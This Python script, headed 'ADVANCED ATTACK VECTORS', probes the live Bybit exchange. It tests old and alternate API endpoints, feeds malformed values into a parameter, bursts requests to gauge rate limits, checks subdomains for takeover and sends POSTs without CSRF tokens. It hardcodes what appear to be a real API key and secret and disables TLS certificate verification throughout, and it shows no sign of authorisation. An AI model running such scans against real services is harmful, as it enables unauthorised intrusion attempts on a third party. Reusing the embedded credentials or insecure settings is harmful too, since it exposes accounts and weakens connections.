#!/usr/bin/env python3
import subprocess
import time
import hmac
import hashlib
import json
import requests

API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com"

requests.packages.urllib3.disable_warnings()

def get_server_time():
    try:
        r = requests.get(f"{BASE_URL}/v5/market/time", verify=False)
        return int(r.json()['time'])
    except:
        return int(time.time() * 1000)

OFFSET = get_server_time() - int(time.time() * 1000)

def get_signature(payload, api_secret):
    return hmac.new(bytes(api_secret, "utf-8"), bytes(payload, "utf-8"), hashlib.sha256).hexdigest()

def send_request(endpoint, params, use_v2=False):
    base = "https://api2.bybit.com" if use_v2 else BASE_URL
    timestamp = str(int(time.time() * 1000) + OFFSET)
    recv_window = "5000"
    
    params_str = "&".join([f"{k}={v}" for k, v in sorted(params.items())])
    sign_payload = f"{timestamp}{API_KEY}{recv_window}{params_str}"
    signature = get_signature(sign_payload, API_SECRET)
    
    headers = {
        "X-BAPI-API-KEY": API_KEY,
        "X-BAPI-SIGN": signature,
        "X-BAPI-SIGN-TYPE": "2",
        "X-BAPI-TIMESTAMP": timestamp,
        "X-BAPI-RECV-WINDOW": recv_window,
    }
    
    try:
        r = requests.get(f"{base}{endpoint}?{params_str}", headers=headers, verify=False, timeout=5)
        return r.json()
    except:
        return {}

print("="*80)
print("ADVANCED ATTACK VECTORS")
print("="*80)

# 1. OLD API VERSIONS (v1, v2, v3) - they might be less protected
print("\n[1] Testing Old API Versions")
old_endpoints = [
    "/v1/user",
    "/v2/private/wallet/balance",
    "/v3/private/account/wallet/balance",
    "/api/v1/user/wallet",
]

for ep in old_endpoints:
    try:
        r = requests.get(f"{BASE_URL}{ep}", timeout=3, verify=False)
        if r.status_code != 404:
            print(f"  {ep}: {r.status_code} (EXISTS!)")
            if r.status_code == 200:
                print(f"    Response: {r.text[:100]}")
    except:
        pass

# 2. API2 (Alternative API server)
print("\n[2] Testing API2 Endpoints (api2.bybit.com)")
res = send_request("/v2/private/wallet/balance", {"coin": "USDT"}, use_v2=True)
if res.get('ret_code') == 0 or res.get('retCode') == 0:
    print("  🚨 API2 Accessible!")
    print(f"  Response: {str(res)[:200]}")
else:
    print(f"  API2: {res.get('ret_code')} / {res.get('retCode')}")

# 3. Business Logic - Precision/Rounding Issues
print("\n[3] Testing Precision Issues (Read-Only Check)")
# Check if API accepts absurd precision
test_prices = [
    "0.00000000000000000001",  # 20 decimals
    "999999999999999999.99",   # Huge number
    "-0.01",                    # Negative
    "1e-50",                    # Scientific notation
]

for price in test_prices:
    # Dry-run: Just query with weird limit values
    res = send_request("/v5/market/orderbook", {
        "category": "spot",
        "symbol": "BTCUSDT",
        "limit": price  # Inject into limit (should be int)
    })
    if res.get('retCode') not in [0, 10001]:  # 0=ok, 10001=param error
        print(f"  Unusual response for limit={price}: {res.get('retCode')}")

# 4. Rate Limiting - Check if we can bypass by switching IPs or headers
print("\n[4] Testing Rate Limiting")
start = time.time()
for i in range(50):
    requests.get(f"{BASE_URL}/v5/market/time", verify=False, timeout=2)
elapsed = time.time() - start
print(f"  50 requests in {elapsed:.2f}s ({50/elapsed:.1f} req/s)")
if 50/elapsed > 20:
    print("  ⚠️  High rate limit threshold or no limit!")

# 5. Subdomain Takeover Check
print("\n[5] Checking Subdomains for Takeover")
subdomains = [
    "test.bybit.com",
    "dev.bybit.com", 
    "staging.bybit.com",
    "demo.bybit.com",
    "beta.bybit.com",
]

for sub in subdomains:
    try:
        r = requests.get(f"https://{sub}", timeout=3, verify=False)
        if "404" in r.text or "NoSuchBucket" in r.text or "There isn't a GitHub Pages site here" in r.text:
            print(f"  🚨 {sub}: Potential takeover! ({r.status_code})")
    except Exception as e:
        if "NXDOMAIN" not in str(e):
            print(f"  {sub}: {str(e)[:50]}")

# 6. CSRF Token Check
print("\n[6] Checking CSRF Protection")
# Check if critical endpoints require CSRF token
critical_endpoints = [
    "/v5/account/set-margin-mode",
    "/v5/account/upgrade-to-uta",
]

for ep in critical_endpoints:
    try:
        # Try POST without CSRF (should fail with specific error)
        r = requests.post(f"{BASE_URL}{ep}", json={}, verify=False, timeout=3)
        if r.status_code == 200 and "csrf" not in r.text.lower():
            print(f"  ⚠️  {ep}: No CSRF token required? Status: {r.status_code}")
    except:
        pass

print("\n" + "="*80)
print("ADVANCED SCAN COMPLETE")
